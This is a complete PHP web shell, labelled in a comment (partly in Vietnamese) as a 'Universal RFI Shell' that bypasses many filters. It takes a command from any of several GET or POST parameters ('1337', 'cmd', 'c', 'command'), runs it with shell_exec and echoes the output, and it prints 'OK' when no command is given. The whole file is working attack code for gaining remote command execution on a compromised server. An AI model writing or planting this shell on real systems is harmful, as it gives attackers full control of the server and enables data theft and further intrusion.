<?php
// Universal RFI Shell - Bypass nhiều filter
$cmd = '';

if(isset($_POST['1337'])) $cmd = $_POST['1337'];
elseif(isset($_GET['1337'])) $cmd = $_GET['1337'];

elseif(isset($_POST['cmd'])) $cmd = $_POST['cmd'];
elseif(isset($_GET['cmd'])) $cmd = $_GET['cmd'];

elseif(isset($_POST['c'])) $cmd = $_POST['c'];
elseif(isset($_GET['c'])) $cmd = $_GET['c'];

elseif(isset($_POST['command'])) $cmd = $_POST['command'];
elseif(isset($_GET['command'])) $cmd = $_GET['command'];

if($cmd !== ''){
    echo htmlspecialchars(@shell_exec($cmd . " 2>&1"), ENT_QUOTES | ENT_HTML5, 'UTF-8');
    exit;
}

echo "OK";
?>
